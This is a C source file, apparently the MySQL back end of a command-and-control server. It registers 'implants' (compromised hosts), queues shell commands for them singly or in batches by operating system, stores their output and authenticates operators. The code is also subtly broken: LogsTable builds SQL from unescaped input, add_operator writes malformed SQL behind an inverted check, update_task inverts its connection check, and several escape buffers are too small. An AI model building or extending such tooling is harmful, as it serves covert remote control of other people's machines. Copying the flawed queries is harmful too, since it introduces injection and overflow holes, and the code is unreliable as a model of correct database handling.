#include "db.h"

#include <mysql/mysql.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

//#include "./cJSON/cJSON.h"
#include <cjson/cJSON.h>
#include <crypt.h>
#include "logs.h"
#include "common.h"

// Define the global variables
MYSQL *db_pool[DB_POOL_SIZE];
pthread_mutex_t db_pool_mutex = PTHREAD_MUTEX_INITIALIZER;
int db_pool_index = 0;
bool user_exists = false;

int init_db_pool(struct DBConf db_conf) {
    for (int i = 0; i < DB_POOL_SIZE; i++) {
        db_pool[i] = mysql_init(NULL);
        if (db_pool[i] == NULL) {
            log_message(LOG_ERROR, "mysql_init() failed for connection %d", i);
            return -1;
        }
        
        // Set connection options if needed
        unsigned int timeout = 30; // 30 seconds timeout
        mysql_options(db_pool[i], MYSQL_OPT_CONNECT_TIMEOUT, &timeout);
        
        if (!mysql_real_connect(db_pool[i], db_conf.host, db_conf.user, 
                               db_conf.pass, db_conf.db, 0, NULL, 0)) {
            log_message(LOG_ERROR, "Failed to create DB connection %d: %s", 
                       i, mysql_error(db_pool[i]));
            mysql_close(db_pool[i]);
            return -1;
        }
        
        // Set auto-reconnect option
        //int reconnect = 1;
        //mysql_options(db_pool[i], MYSQL_OPT_RECONNECT, &reconnect);
        
        //log_message(LOG_INFO, "DB connection %d initialized successfully", i);
    }
    return 0;
}

MYSQL* get_db_connection(void) {
    pthread_mutex_lock(&db_pool_mutex);
    MYSQL *conn = db_pool[db_pool_index];
    db_pool_index = (db_pool_index + 1) % DB_POOL_SIZE;
    pthread_mutex_unlock(&db_pool_mutex);
    return conn;
}

void cleanup_db_pool(void) {
    for (int i = 0; i < DB_POOL_SIZE; i++) {
        if (db_pool[i]->net.vio != NULL) { // Check if connection is active
            mysql_close(db_pool[i]);
            log_message(LOG_INFO, "Closed DB connection %d", i);
        }
    }
    pthread_mutex_destroy(&db_pool_mutex);
}

//static DBConfig g_dbconf;
/*
int db_conn(const char *dbserver, const char *user, const char *pass, const char *db) {
    //g_dbconf.host = dbserver;
    //g_dbconf.user = user;
    //g_dbconf.pass = pass;
    //g_dbconf.db   = db;
    //g_dbconf.port = port;
    con = mysql_init(NULL);
    if (con == NULL) return -1;
    if (mysql_real_connect(con, dbserver, user, pass, db, 0, NULL, 0) == NULL) return -1;
    return 0;
}



void db_close() {
    mysql_close(con);
}
*/

int check_implant_id(MYSQL* con, char* implant_id) {

    mysql_thread_init();
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char query[1024];
    snprintf(query, sizeof(query), "SELECT * FROM Implants WHERE implant_id = '%s'", esc);
    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Checking If implant id exists Query Failed: %s", mysql_error(con)); 
        return 0;
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return 0;
    int num_rows = mysql_num_rows(result);
    mysql_free_result(result);

    return (num_rows > 0);
}

char *get_task(MYSQL* con, int task_id) {
    char query[1024];
    snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);
    if (mysql_query(con, query)) return NULL;
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return NULL;
    MYSQL_ROW row = mysql_fetch_row(result);
    char *cmd = NULL;
    if (row && row[0]) cmd = strdup(row[0]);
    mysql_free_result(result);
    return cmd;
}

void store_task_response(MYSQL* con, char *response, int task_id) {
    char esc[BUFFER_SIZE * 2];
    mysql_real_escape_string(con, esc, response, strlen(response));
    char *query = malloc(strlen(esc) + 256);
    snprintf(query, strlen(esc) + 256, "UPDATE Tasks SET status = TRUE, response = '%s' WHERE task_id = %d;", esc, task_id);
    
    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Storing Task Response Query Failed: %s", mysql_error(con));
    }
    free(query);
}

int check_tasks_queue(MYSQL* con, char *implant_id) {
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char query[1024];
    snprintf(query, sizeof(query), "SELECT task_id, status FROM Tasks WHERE implant_id = '%s';", esc);  
    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Checking for Tasks Query Failed: %s", mysql_error(con));
        return -1;
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return -1;
    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        if (row[1] != NULL && atoi(row[1]) == 0) {
            int task_id = atoi(row[0]);
            mysql_free_result(result);
            return task_id;
        }
    }
    mysql_free_result(result);
    return -1;
}

void new_implant(MYSQL *con, struct db_agents args) {
    char query[2048];

    char esc_id[9];
    char esc_os[64];
    char esc_ip[50];
    char esc_arch[50];
    char esc_hostname[255];

    mysql_real_escape_string(con, esc_id, args.implant_id, strlen(args.implant_id));
    mysql_real_escape_string(con, esc_os, args.os, strlen(args.os));
    mysql_real_escape_string(con, esc_arch, args.arch, strlen(args.arch));
    mysql_real_escape_string(con, esc_ip, args.ip, strlen(args.ip));
    mysql_real_escape_string(con, esc_hostname, args.hostname, strlen(args.hostname));

    snprintf(query, sizeof(query), "INSERT INTO Implants (implant_id, os, ip, arch, hostname) VALUES ('%s', '%s', '%s', '%s', '%s');",
             esc_id, esc_os, esc_ip, esc_arch, esc_hostname);
    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Adding New Implant Query Failed: %s", mysql_error(con));
    }
}

void update_last_seen(MYSQL* con, char *implant_id) {
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char query[1024];
    snprintf(query, sizeof(query), "UPDATE Implants SET last_seen = CURRENT_TIMESTAMP() WHERE implant_id = '%s';", esc);
    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Updating beacon last seen Query Failed: %s", mysql_error(con));
    }

}
/*
void TasksTable(MYSQL* con, struct db_tasks args) {
    char query[4096 + 4096];
    snprintf(query, sizeof(query), "INSERT INTO Tasks (implant_id, command, response) VALUES ('%s', '%s', '%s');",
             args.implant_id, args.command, args.response);

    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Storing Task Response Query Failed: %s", mysql_error(con));
    }
}
*/

void new_tasks(MYSQL* con, char *implant_id, char *command) {
    char esc_id[9];
    char esc_cmd[1024];
    mysql_real_escape_string(con, esc_id, implant_id, strlen(implant_id));
    mysql_real_escape_string(con, esc_cmd, command, strlen(command));
    size_t len = snprintf(NULL, 0, "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", esc_id, esc_cmd);
    char *query = malloc(len + 1);

    snprintf(query, len + 1, "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", esc_id, esc_cmd);
    //if (mysql_ping(con) == 0) {
    //    log_message(LOG_ERROR, "No mysql Connection");
    //    free(query);
    //    return;
    //}

    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Inserting New Tasks Query Failed: %s", mysql_error(con));
    }
    free(query);
    return;
}

char *tasks_per_implant(MYSQL* con, char *implant_id) {
    char esc[130];
    mysql_real_escape_string(con, esc, implant_id, strlen(implant_id));
    char *query = malloc(1024);
    snprintf(query, 1024, "SELECT task_id, command, response, status FROM Tasks WHERE implant_id = '%s';", esc);

    if (mysql_ping(con) != 0) {
        log_message(LOG_ERROR, "MySQL connection lost: %s", mysql_error(con));
        free(query);
        return NULL;
    }

    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Query failed [Getting Tasks Per Implant]: %s", mysql_error(con));
        free(query);
        return NULL;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (!result) {
        log_message(LOG_ERROR, "Failed to store result [Getting Tasks Per Implant]: %s", mysql_error(con));
        free(query);
        return NULL;
    }

    int num_fields = mysql_num_fields(result);
    MYSQL_FIELD *fields = mysql_fetch_fields(result);
    cJSON *column_arrays[num_fields];
    for (int i = 0; i < num_fields; i++) column_arrays[i] = cJSON_CreateArray();
    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        for (int i = 0; i < num_fields; i++) {
            if (row[i]) cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
            else cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
        }
    }
    cJSON *root = cJSON_CreateObject();
    for (int i = 0; i < num_fields; i++) cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
    char *json_output = cJSON_Print(root);

    cJSON_Delete(root);
    mysql_free_result(result);
    free(query);

    return json_output;
}


int authenticate_operator(MYSQL* con, char *username, char *password) {
    if (!username || !password) return -1;
    if (strlen(username) > 100 || strlen(password) > 100) return -1;

    // Escape username (prevent SQL injection)
    char esc_user[128];
    if (strlen(username) * 2 + 1 > sizeof(esc_user)) return -1;
    mysql_real_escape_string(con, esc_user, username, strlen(username));

    char query[256];
    if (snprintf(query, sizeof(query),
                "SELECT password FROM Operators WHERE username='%s'", 
                esc_user) >= (int)sizeof(query)) {
        return -1;
    }

    // Execute query
    //for (int i = 0; i < 3; i++) {
        if (mysql_ping(con) != 0) {

            //if (db_conn(g_dbconf.host, g_dbconf.user, g_dbconf.pass, g_dbconf.db) == -1) {
            //    log_message(LOG_ERROR, "Reconnection failed: %s", mysql_error(con));
            //    return -1;
            //}
            return -1;
        }
        if (mysql_query(con, query)) {
            //fprintf(stderr, "[-] Query failed: %s\n", mysql_error(con));
            log_message(LOG_ERROR, "Authentication Query Failed: %s", mysql_error(con));
            return -1;
        }

    MYSQL_RES *res = mysql_store_result(con);
    if (!res) {
        //fprintf(stderr, "[-] Failed to store result: %s\n", mysql_error(con));
        log_message(LOG_ERROR, "Failed to store result [Authentication]: %s", mysql_error(con));
        return -1;
    }
    
    MYSQL_ROW row = mysql_fetch_row(res);
    if (!row || !row[0]) {
        mysql_free_result(res);
        return -1;  // User not found
    }

    // Verify bcrypt hash
    const char *stored_hash = row[0];
    if (strlen(stored_hash) < 60 || stored_hash[0] != '$') {
        mysql_free_result(res);
        return -1;  // Invalid hash format
    }

    // Verify using crypt()
    char *result = crypt(password, stored_hash);
    
    if (result == NULL) {
        //perror("crypt() failed");
        log_message(LOG_ERROR, "crypt failed");
        mysql_free_result(res);
        return 1;
    }

    int auth_result;
    if (strcmp(result, stored_hash) == 0) { 
        auth_result = 0;
    } else {
        auth_result = -1;
    }
    mysql_free_result(res);
    return auth_result;
}

bool check_operator(MYSQL* con) {
    if (user_exists == true) return true;
    char query[128] = "SELECT * FROM Operators";
    if (mysql_ping(con) != 0) return false;

    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Failed to check operator: %s", mysql_error(con));
        return false;
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (!result) return false;

     MYSQL_ROW row = mysql_fetch_row(result);
    if (!row || !row[0] ) return false;
    else return true;
}

bool add_operator(MYSQL* con, char *username, char *password_hash) {
    if (!username || !password_hash) return false;
    if (strlen(username) > 100) {
	log_message(LOG_ERROR, "Username length is greater than 100");
    	return false;
    }

    char esc_user[128];
    if (strlen(username) * 2 + 1 > sizeof(esc_user)) return false;
    mysql_real_escape_string(con, esc_user, username, strlen(username));

    char query[256];
    if (snprintf(query, sizeof(query),
                "Insert (usersernam, password) INTO Operators VALUES ('%s', '%s')", username, password_hash )) {
	return false;
    }

     if (mysql_ping(con) != 0) return false;

    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Failed to add operator: %s", mysql_error(con));
        return false;
    }
    log_message(LOG_INFO, "Added new operator %s", username);
    user_exists = true;
    return true;
}

char *GetData(MYSQL* con, char *table) {
    char esc[256];
    mysql_real_escape_string(con, esc, table, strlen(table));
    char *query = malloc(1024);
    snprintf(query, 1024, "SELECT * FROM %s;", esc);
    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Geting data from %s Query failed", table);    
        return NULL;
    }
    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return NULL;
    int num_fields = mysql_num_fields(result);
    MYSQL_FIELD *fields = mysql_fetch_fields(result);
    cJSON *column_arrays[num_fields];
    for (int i = 0; i < num_fields; i++) column_arrays[i] = cJSON_CreateArray();
    MYSQL_ROW row;
    while ((row = mysql_fetch_row(result))) {
        for (int i = 0; i < num_fields; i++) {
            if (row[i]) cJSON_AddItemToArray(column_arrays[i], cJSON_CreateString(row[i]));
            else cJSON_AddItemToArray(column_arrays[i], cJSON_CreateNull());
        }
    }
    cJSON *root = cJSON_CreateObject();
    for (int i = 0; i < num_fields; i++) cJSON_AddItemToObject(root, fields[i].name, column_arrays[i]);
    char *json_output = cJSON_Print(root);
    cJSON_Delete(root);
    mysql_free_result(result);
    free(query);
    return json_output;
}

void LogsTable(MYSQL* con, struct db_logs args) {
    char query[4096+1028];
    snprintf(query, sizeof(query), "INSERT INTO Logs (implant_id, log_type, message) VALUES ('%s', '%s', '%s');",
             args.implant_id, args.log_type, args.message);
    mysql_query(con, query);
}

char *cmd_and_response(MYSQL* con, int task_id) {
    char query[256];
    snprintf(query, sizeof(query), "SELECT command FROM Tasks WHERE task_id = %d;", task_id);

    if (mysql_query(con, query)) {
        return NULL;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) {
        return NULL;
    }

    MYSQL_ROW row = mysql_fetch_row(result);
    char *cmd = NULL;

    if (row && row[0]) {
        cmd = strdup(row[0]);  // Copy command string
    }

    mysql_free_result(result);
    return cmd;  // Must be freed by the caller
}


bool update_task(MYSQL* con,int task_id, char*command) {
    // first check if task is completed
    char query[BUFFER_SIZE*2];
    snprintf(query, sizeof(query), "SELECT status FROM Tasks WHERE task_id = %d;", task_id);
    
    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Checking for Update tasks Failed: %s", mysql_error(con));
        return false;
    }

    MYSQL_RES *result = mysql_store_result(con);
    if (result == NULL) return false;
    MYSQL_ROW row = mysql_fetch_row(result);
    if (row[0] == NULL || atoi(row[0]) != 0) {
        mysql_free_result(result);
        return false    ;
    }
    mysql_free_result(result);
    
    memset(query, 0, sizeof(query));
    char esc_cmd[BUFFER_SIZE];
    mysql_real_escape_string(con, esc_cmd, command, BUFFER_SIZE);
    snprintf(query, sizeof(query), "UPDATE Tasks SET command = '%s' WHERE task_id = %d", esc_cmd, task_id);
    if (mysql_ping(con) == 0) { 
        return false;
    }

    if (mysql_query(con, query)) {
        log_message(LOG_ERROR, "Updating Tasks Query Failed: %s", mysql_error(con));
        return false;
    }
    return true;
}



bool batch_tasks(MYSQL* con, char *command, char *os) {
    char esc_cmd[BUFFER_SIZE];
    char esc_os[BUFFER_SIZE];
    MYSQL_RES *res;
    MYSQL_ROW row;
    char query[BUFFER_SIZE*2];
    mysql_real_escape_string(con, esc_cmd, command, strlen(command));

    
    if (os == NULL) {
        snprintf(query, sizeof(query), "SELECT implant_id FROM Implants;");

        if (mysql_query(con, query)) {
            log_message(LOG_ERROR, "Batch New Tasks Failed: %s", mysql_error(con));
            return false;
        }

        res = mysql_store_result(con);
        if (!res) {
            log_message(LOG_ERROR, "Getting Implant IDs Failed : %s", mysql_error(con));
            return false;
        }
        while ((row = mysql_fetch_row(res)) != NULL) {
            memset(query, 0, sizeof(query));    
            snprintf(query, sizeof(query), "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", row[0], esc_cmd);
            if (mysql_query(con, query)) {
                log_message(LOG_ERROR, "Inserting New Tasks Query Failed: %s", mysql_error(con));
                continue;
            }
        }
    } else {
            mysql_real_escape_string(con, esc_os, os, strlen(os));
            snprintf(query, sizeof(query), "SELECT implant_id FROM Implants WHERE os = '%s';", esc_os);

            if (mysql_query(con, query)) {
                log_message(LOG_ERROR, "Batch New Tasks Failed: %s", mysql_error(con));
                return false;
            }

            res = mysql_store_result(con);
            if (!res) {
                log_message(LOG_ERROR, "Getting Implant IDs Failed : %s", mysql_error(con));
                return false;
            }
            while ((row = mysql_fetch_row(res)) != NULL) {
            memset(query, 0, sizeof(query));    
            snprintf(query, sizeof(query), "INSERT INTO Tasks (implant_id, command) VALUES ('%s', '%s');", row[0], esc_cmd);
            if (mysql_query(con, query)) {
                log_message(LOG_ERROR, "Inserting New Tasks Query Failed: %s", mysql_error(con));
                continue;
            }
        }
    }
    mysql_free_result(res);
    return true;
}
